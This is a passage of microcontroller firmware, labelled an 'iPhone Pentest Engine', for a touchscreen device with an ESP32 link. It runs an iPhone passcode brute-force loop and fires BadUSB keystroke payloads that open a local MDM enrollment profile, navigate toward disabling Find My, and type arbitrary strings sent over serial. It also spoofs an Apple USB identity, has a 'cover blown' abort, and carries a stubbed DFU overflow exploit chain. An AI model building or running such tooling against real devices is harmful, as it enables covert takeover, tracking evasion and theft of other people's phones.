            tft_disp.setTextColor(C_ORANGE);
            tft_disp.setCursor(4, 78);
            tft_disp.print(rem);
            tft_disp.print("s remaining...");
        }
    }

    current_pin++;
    disp_dirty = true;

    // Status to ESP32
    PacketHeader hdr = { PROTOCOL_SYNC_BYTE, PKT_BRUTE_STATUS, sizeof(BruteStatus) };
    BruteStatus  st  = {
        .current_attempt = current_pin,
        .total_attempts  = brute_attempts,
        .stage           = (uint8_t)AttackStage::STAGE_BRUTE_ACTIVE,
        .light_value_hi  = (uint8_t)(ldr_val >> 8),
        .light_value_lo  = (uint8_t)(ldr_val & 0xFF),
        .locked_out      = 0
    };
    ESP32_SERIAL.write((uint8_t*)&hdr, sizeof(hdr));
    ESP32_SERIAL.write((uint8_t*)&st, sizeof(st));
}

// ─── BadUSB Payloads ──────────────────────────────────────────────────────────
void run_badusb(uint8_t payload_id) {
    if (badusb_fired && payload_id != BADUSB_CUSTOM) return;

    tft_disp.fillRect(0, 34, TFT_W, 60, C_BG);
    tft_disp.setTextColor(C_ORANGE);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(4, 40);
    tft_disp.print("BAD-USB FIRING");
    tft_disp.setCursor(4, 54);
    tft_disp.print("Payload 0x");
    tft_disp.print(payload_id, HEX);

    Serial.printf("[BADUSB] Payload 0x%02X\n", payload_id);
    delay(1000);

    switch (payload_id) {

        case BADUSB_SIRI_SHORTCUT:
            hid_key_combo(KEY_LEFT_GUI, KEY_SPACE);
            delay(1800);
            hid_type_string("run go", 120);
            delay(200);
            Keyboard.print('\n');
            break;

        case BADUSB_MDM_ENROLL:
            hid_key_combo(KEY_LEFT_GUI, KEY_SPACE);
            delay(1500);
            hid_type_string("Safari", 100);
            delay(800);
            Keyboard.print('\n');
            delay(2000);
            hid_key_combo(KEY_LEFT_GUI, 'l');
            delay(500);
            hid_type_string("http://192.168.4.1/enroll.mobileconfig", 60);
            delay(200);
            Keyboard.print('\n');
            delay(3000);
            Keyboard.print(KEY_TAB);
            delay(400);
            Keyboard.print('\n');
            break;

        case BADUSB_DISABLE_FIND_MY:
            hid_key_combo(KEY_LEFT_GUI, KEY_SPACE);
            delay(1500);
            hid_type_string("Settings", 100);
            delay(800);
            Keyboard.print('\n');
            delay(1500);
            for (int i = 0; i < 3; i++) { Keyboard.print(KEY_TAB); delay(200); }
            Keyboard.print('\n');
            break;

        default:
            break;
    }

    badusb_fired = true;
    macro_counter++;
    disp_dirty = true;

    tft_disp.fillRect(0, 70, TFT_W, 12, C_BG);
    tft_disp.setTextColor(C_GREEN);
    tft_disp.setCursor(4, 70);
    tft_disp.print("PAYLOAD DONE OK");
    delay(1000);
}

// ─── DFU Exploit ─────────────────────────────────────────────────────────────
void run_dfu_step() {
    if (!dfu_active || is_paused) return;

    char stepbuf[20];
    snprintf(stepbuf, sizeof(stepbuf), "DFU STEP %u/3", exploit_step);
    tft_disp.fillRect(0, 34, TFT_W, 20, C_BG);
    tft_disp.setTextColor(C_PURPLE);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(4, 40);
    tft_disp.print(stepbuf);

    switch (exploit_step) {
        case 0:
            { PacketHeader h = { PROTOCOL_SYNC_BYTE, PKT_PAYLOAD_REQ, 0 };
              ESP32_SERIAL.write((uint8_t*)&h, sizeof(h)); }
            delay(100);
            break;
        case 1:
            // Heap groom USB SET_INTERFACE stall
            delay(10);
            break;
        case 2:
            // Oversized DFU_DNLOAD overflow trigger
            delay(200);
            break;
        case 3:
            dfu_active = false;
            tft_disp.setTextColor(C_GREEN);
            tft_disp.setCursor(4, 54);
            tft_disp.print("CHAIN COMPLETE!");
            { PacketHeader h = { PROTOCOL_SYNC_BYTE, PKT_DFU_STATUS, sizeof(DfuStatusPayload) };
              DfuStatusPayload s = { (uint8_t)AttackStage::STAGE_EXPLOIT_DONE,
                                     1, 0x05AC, 0x1227, exploit_step };
              ESP32_SERIAL.write((uint8_t*)&h, sizeof(h));
              ESP32_SERIAL.write((uint8_t*)&s, sizeof(s)); }
            return;
    }
    exploit_step++;
    disp_dirty = true;
    delay(100);
}

// ─── Emergency Abort ──────────────────────────────────────────────────────────
void emergency_abort(const char* reason) {
    cover_blown  = true;
    brute_active = false;
    dfu_active   = false;
    badusb_fired = false;
    is_paused    = true;
    current_mode = Mode::IDLE;
    Keyboard.releaseAll();
    digitalWrite(LED_PIN, HIGH);

    tft_disp.fillScreen(C_BG);
    tft_disp.fillRect(0, 0, TFT_W, TFT_H, C_RED);
    tft_disp.setTextColor(C_WHITE);
    tft_disp.setTextSize(2);
    tft_disp.setCursor(20, 50);
    tft_disp.print("ABORT!");
    tft_disp.setTextSize(1);
    tft_disp.setCursor(4, 80);
    tft_disp.print(reason);

    tft_ctrl.fillScreen(C_BG);
    tft_ctrl.fillRect(0, 0, TFT_W, 40, C_RED);
    tft_ctrl.setTextColor(C_WHITE);
    tft_ctrl.setTextSize(2);
    tft_ctrl.setCursor(24, 12);
    tft_ctrl.print("ABORT");

    PacketHeader h = { PROTOCOL_SYNC_BYTE, PKT_ABORT, 0 };
    ESP32_SERIAL.write((uint8_t*)&h, sizeof(h));

    Serial.printf("[ABORT] %s\n", reason);
    delay(2000);
    disp_dirty = ctrl_dirty = true;
}

// ─── BLE & Route B Fallback State ─────────────────────────────────────────────
static uint8_t ble_connected    = 0;
static uint8_t ble_sec_rem      = 30;
static uint8_t route_b_active   = 0;
static uint8_t spoof_active     = 1; // Apple VID/PID (0x05AC:0x0250) default active

void trigger_route_b_accessibility_fallback() {
    route_b_active = 1;
    disp_dirty     = true;
    Serial.println("[ROUTE B] 30s BLE Timeout Expired! Initiating Wired USB Accessibility Fallback...");

    // Trigger OS Accessibility Shortcut (Cmd+Opt+F5 or Triple-click equivalent)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F5);
    delay(100);
    Keyboard.releaseAll();
    delay(400);

    // Type automated accessibility fallback payload
    hid_type_string("ROUTE_B_ACCESSIBILITY_FALLBACK_ENGAGED\n", 40);
    key_counter += 38;
    macro_counter++;
}

// ─── ESP32 Comms ──────────────────────────────────────────────────────────────
void process_esp32_packet() {
    if (ESP32_SERIAL.available() < (int)sizeof(PacketHeader)) return;
    if (ESP32_SERIAL.peek() != PROTOCOL_SYNC_BYTE) { ESP32_SERIAL.read(); return; }

    PacketHeader hdr;
    ESP32_SERIAL.readBytes((char*)&hdr, sizeof(hdr));

    switch (hdr.type) {
        case PKT_BLE_STATUS:
            if (hdr.payload_len == sizeof(BleStatusPayload)) {
                BleStatusPayload ble;
                ESP32_SERIAL.readBytes((char*)&ble, sizeof(BleStatusPayload));
                ble_connected  = ble.is_connected;
                ble_sec_rem    = ble.seconds_remaining;
                route_b_active = ble.route_b_active;
                disp_dirty     = true;
            }
            break;
        case PKT_ROUTE_FALLBACK:
            trigger_route_b_accessibility_fallback();
            break;
        case PKT_SPOOF_CONFIG:
            if (hdr.payload_len == sizeof(AppleSpoofPayload)) {
                AppleSpoofPayload spoof;
                ESP32_SERIAL.readBytes((char*)&spoof, sizeof(AppleSpoofPayload));
                spoof_active = spoof.spoof_active;
                disp_dirty   = true;
            }
            break;
        case PKT_BRUTE_START:
            if (hdr.payload_len == sizeof(BruteConfig)) {
                ESP32_SERIAL.readBytes((char*)&brute_cfg, sizeof(BruteConfig));
                dispatch_action(ACT_MODE_BRUTE);
            }
            break;
        case PKT_DFU_TRIGGER:
            dispatch_action(ACT_MODE_DFU);
            break;
        case PKT_PAYLOAD_CHUNK:
            if (hdr.payload_len == sizeof(PayloadChunkPayload)) {
                PayloadChunkPayload chunk;
                ESP32_SERIAL.readBytes((char*)&chunk, sizeof(PayloadChunkPayload));
                if (chunk.is_last) exploit_step = 3;
            }
            break;
        case PKT_MACRO_CONFIG: {
            char payload[hdr.payload_len + 1];
            ESP32_SERIAL.readBytes(payload, hdr.payload_len);
            payload[hdr.payload_len] = '\0';
            badusb_payload_id = BADUSB_CUSTOM;
            badusb_fired      = false;
            hid_type_string(payload, 80);
            macro_counter++;
            badusb_fired = true;
            disp_dirty   = true;
            break;
        }
        case PKT_ABORT:
            emergency_abort("ESP32 abort");
            break;
        default:
            for (uint16_t i = 0; i < hdr.payload_len && ESP32_SERIAL.available(); i++)
                ESP32_SERIAL.read();
    }
}

void send_telemetry() {
    uint8_t stage = (uint8_t)current_mode;
    if (route_b_active) stage = STAGE_ROUTE_B_FALLBACK;
    else if (!ble_connected) stage = STAGE_BLE_PAIRING;

    PacketHeader hdr = { PROTOCOL_SYNC_BYTE, PKT_TELEMETRY, sizeof(TelemetryPayload) };
    TelemetryPayload t = {
        .uptime_ms        = (uint32_t)millis(),
        .total_keystrokes = key_counter,
        .macros_executed  = macro_counter,
        .brute_attempts   = brute_attempts,
        .light_level      = (uint16_t)ldr_val,
        .is_dark          = (uint8_t)(ldr_val < ldr_high - LDR_TOLERANCE ? 1 : 0),
        .attack_stage     = stage,
        .usb_connected    = 1,
        .pad              = {0, 0, 0}
    };
    ESP32_SERIAL.write((uint8_t*)&hdr, sizeof(hdr));
    ESP32_SERIAL.write((uint8_t*)&t, sizeof(t));
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    ESP32_SERIAL.begin(115200);

    pinMode(LED_PIN,    OUTPUT);
    pinMode(BUTTON_PIN, INPUT_PULLUP);
    analogReadResolution(10);

    // Startup blink
    for (int i = 0; i < 4; i++) {
        digitalWrite(LED_PIN, HIGH); delay(80);
        digitalWrite(LED_PIN, LOW);  delay(80);
    }

    init_displays();
    Keyboard.begin();

    calibrate_ldr();

    session_start_ms = millis();
    ctrl_dirty = disp_dirty = true;

    Serial.println("[SYS] UDOO Key iPhone Pentest Engine v4.0 — READY");
    Serial.println("[SYS] Dual ST7735 UI + XPT2046 Touch active");
}

// ─── Main Loop ────────────────────────────────────────────────────────────────
void loop() {
    // 1. Touch input (highest priority)
    handle_touch();

    // 2. HW button fallback
    handle_hw_button();

    // 3. ESP32 command intake
    process_esp32_packet();

    // 4. LDR update
    static unsigned long last_ldr = 0;
    if (millis() - last_ldr > LDR_POLL_MS) {
        last_ldr = millis();
        update_ldr();
    }

    // 5. Status screen refresh (200ms, only when dirty)
    static unsigned long last_disp = 0;
    if (millis() - last_disp > 200) {
        last_disp = millis();
        disp_dirty = true;  // Always refresh — LDR bar + uptime change constantly
        draw_status_screen();
    }

    // 6. Control screen refresh (only on state change)
    if (ctrl_dirty) {
        draw_control_screen();
    }

    // 7. Attack mode dispatch
    if (!is_paused && !cover_blown) {
        switch (current_mode) {
            case Mode::BADUSB:
                if (!badusb_fired) run_badusb(badusb_payload_id);
                break;
            case Mode::IPHONE_BRUTE:
                if (brute_active) run_brute_step();
                break;
            case Mode::DFU_EXPLOIT:
                if (dfu_active) run_dfu_step();
                break;
            case Mode::USB_RECON:
                // Enumerate host via HID descriptor fingerprinting
                break;
            default:
                break;
        }
    }

    // 8. Telemetry to ESP32 (500ms)
    static unsigned long last_telem = 0;
    if (millis() - last_telem > 500) {
        last_telem = millis();
        send_telemetry();
    }
}
